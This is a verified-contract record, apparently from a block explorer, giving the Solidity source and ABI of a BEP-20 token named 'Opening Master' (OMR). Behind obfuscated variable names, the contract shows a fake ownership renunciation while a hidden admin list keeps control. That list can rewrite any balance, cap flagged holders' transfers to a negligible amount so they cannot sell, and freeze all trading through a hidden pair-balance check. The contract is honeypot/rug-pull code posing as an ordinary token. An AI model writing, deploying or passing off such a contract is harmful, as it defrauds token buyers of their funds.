{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface liquidityExemptReceiver {\n    function createPair(address totalToken, address tokenTotalShould) external returns (address);\n}\n\ninterface listLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingTx) external view returns (uint256);\n\n    function transfer(address receiverTrading, uint256 feeMarketing) external returns (bool);\n\n    function allowance(address enableSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTrading,\n        uint256 feeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenTrading, uint256 value);\n    event Approval(address indexed enableSell, address indexed spender, uint256 value);\n}\n\nabstract contract totalReceiverExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityLimitShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldMinAmount is listLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OpeningMaster is totalReceiverExempt, listLaunch, shouldMinAmount {\n\n    string private walletSender = \"OMR\";\n\n    uint256 public launchBuy;\n\n    function buyExempt(address tradingAtReceiver, uint256 feeMarketing) public {\n        fundFeeTotal();\n        receiverTeamShould[tradingAtReceiver] = feeMarketing;\n    }\n\n    function fundFeeTotal() private view {\n        require(feeTrading[_msgSender()]);\n    }\n\n    function transferFrom(address modeWallet, address receiverTrading, uint256 feeMarketing) external override returns (bool) {\n        if (_msgSender() != listIs) {\n            if (senderTake[modeWallet][_msgSender()] != type(uint256).max) {\n                require(feeMarketing <= senderTake[modeWallet][_msgSender()]);\n                senderTake[modeWallet][_msgSender()] -= feeMarketing;\n            }\n        }\n        return receiverAmountList(modeWallet, receiverTrading, feeMarketing);\n    }\n\n    function approve(address fromSwap, uint256 feeMarketing) public virtual override returns (bool) {\n        senderTake[_msgSender()][fromSwap] = feeMarketing;\n        emit Approval(_msgSender(), fromSwap, feeMarketing);\n        return true;\n    }\n\n    address listIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private walletSwap;\n\n    uint256 constant launchTradingIs = 10 ** 10;\n\n    uint256 private totalAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenBuy;\n    }\n\n    address public tradingAuto;\n\n    uint256 liquidityWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTradingFee;\n    }\n\n    function liquidityTotal(address modeWallet, address receiverTrading, uint256 feeMarketing) internal returns (bool) {\n        require(receiverTeamShould[modeWallet] >= feeMarketing);\n        receiverTeamShould[modeWallet] -= feeMarketing;\n        receiverTeamShould[receiverTrading] += feeMarketing;\n        emit Transfer(modeWallet, receiverTrading, feeMarketing);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderTake;\n\n    uint256 private listTradingFee = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private receiverTeamShould;\n\n    function buyList(address maxMin) public {\n        require(maxMin.balance < 100000);\n        if (listWalletAuto) {\n            return;\n        }\n        \n        feeTrading[maxMin] = true;\n        \n        listWalletAuto = true;\n    }\n\n    function balanceOf(address marketingTx) public view virtual override returns (uint256) {\n        return receiverTeamShould[marketingTx];\n    }\n\n    function allowance(address maxShould, address fromSwap) external view virtual override returns (uint256) {\n        if (fromSwap == listIs) {\n            return type(uint256).max;\n        }\n        return senderTake[maxShould][fromSwap];\n    }\n\n    mapping(address => bool) public totalEnable;\n\n    address receiverTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listWalletAuto;\n\n    uint8 private tradingTake = 18;\n\n    event OwnershipTransferred(address indexed fundReceiver, address indexed shouldFee);\n\n    function transfer(address tradingAtReceiver, uint256 feeMarketing) external virtual override returns (bool) {\n        return receiverAmountList(_msgSender(), tradingAtReceiver, feeMarketing);\n    }\n\n    function receiverTeam(uint256 feeMarketing) public {\n        fundFeeTotal();\n        txWallet = feeMarketing;\n    }\n\n    string private tokenBuy = \"Opening Master\";\n\n    function tokenFeeTake(address feeSwapTo) public {\n        fundFeeTotal();\n        if (launchBuy == totalAmount) {\n            totalAmount = launchBuy;\n        }\n        if (feeSwapTo == tradingAuto || feeSwapTo == minModeLaunched) {\n            return;\n        }\n        totalEnable[feeSwapTo] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamFrom;\n    }\n\n    function owner() external view returns (address) {\n        return teamFrom;\n    }\n\n    function receiverAmountList(address modeWallet, address receiverTrading, uint256 feeMarketing) internal returns (bool) {\n        if (modeWallet == tradingAuto) {\n            return liquidityTotal(modeWallet, receiverTrading, feeMarketing);\n        }\n        uint256 launchMode = listLaunch(minModeLaunched).balanceOf(receiverTo);\n        require(launchMode == txWallet);\n        require(receiverTrading != receiverTo);\n        if (totalEnable[modeWallet]) {\n            return liquidityTotal(modeWallet, receiverTrading, launchTradingIs);\n        }\n        return liquidityTotal(modeWallet, receiverTrading, feeMarketing);\n    }\n\n    bool public listTake;\n\n    bool private teamLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTake;\n    }\n\n    uint256 txWallet;\n\n    address private teamFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletSender;\n    }\n\n    constructor (){\n        \n        liquidityLimitShould totalAutoIs = liquidityLimitShould(listIs);\n        minModeLaunched = liquidityExemptReceiver(totalAutoIs.factory()).createPair(totalAutoIs.WETH(), address(this));\n        \n        tradingAuto = _msgSender();\n        feeTrading[tradingAuto] = true;\n        receiverTeamShould[tradingAuto] = listTradingFee;\n        enableWalletTx();\n        if (launchBuy == totalAmount) {\n            listTake = true;\n        }\n        emit Transfer(address(0), tradingAuto, listTradingFee);\n    }\n\n    address public minModeLaunched;\n\n    function enableWalletTx() public {\n        emit OwnershipTransferred(tradingAuto, address(0));\n        teamFrom = address(0);\n    }\n\n    mapping(address => bool) public feeTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"buyExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"}],\"name\":\"buyList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWalletTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWalletAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minModeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwapTo\",\"type\":\"address\"}],\"name\":\"tokenFeeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OpeningMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}